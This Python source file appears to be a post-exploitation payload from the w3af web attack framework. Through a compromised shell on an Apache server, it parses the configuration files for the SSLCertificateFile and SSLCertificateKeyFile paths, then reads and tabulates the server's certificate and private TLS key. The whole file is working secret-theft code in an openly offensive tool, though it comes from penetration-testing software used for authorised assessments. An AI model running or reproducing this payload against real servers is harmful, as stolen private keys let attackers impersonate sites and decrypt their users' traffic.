import re
from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class apache_ssl(Payload):
    """
    This payload shows Apache SSL Certificate & Key
    """
    def api_read(self):
        result = {}
        result['apache_ssl_certificate'] = {}
        result['apache_ssl_key'] = {}

        def parse_ssl_cert(apache_config):
            cert = re.search('(?<=SSLCertificateFile)(?! directive)    (.*)',
                             apache_config)
            if cert:
                return cert.group(1)
            else:
                return ''

        def parse_ssl_key(apache_config):
            key = re.search('(?<=SSLCertificateKeyFile )(.*)', apache_config)
            if key:
                return key.group(1)
            else:
                return ''

        apache_files = self.exec_payload(
            'apache_config_files')['apache_config']
        for file in apache_files:
            content = self.shell.read(file)
            if parse_ssl_cert(content) != '':
                cert_content = self.shell.read(parse_ssl_cert(content))
                if cert_content:
                    result['apache_ssl_certificate'][
                        parse_ssl_cert(content)] = cert_content

            if parse_ssl_key(content) != '':
                key_content = self.shell.read(parse_ssl_key(content))
                if key_content:
                    result['apache_ssl_key'][
                        parse_ssl_key(content)] = key_content

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result['apache_ssl_certificate'] and not api_result['apache_ssl_key']:
            return 'Apache SSL key and Certificate not found.'
        else:
            rows = []
            rows.append(['Description', 'Value'])
            rows.append([])
            for key_name in api_result:
                for desc, value in api_result[key_name].iteritems():
                    rows.append([desc, value])
            result_table = table(rows)
            result_table.draw(80)
            return rows
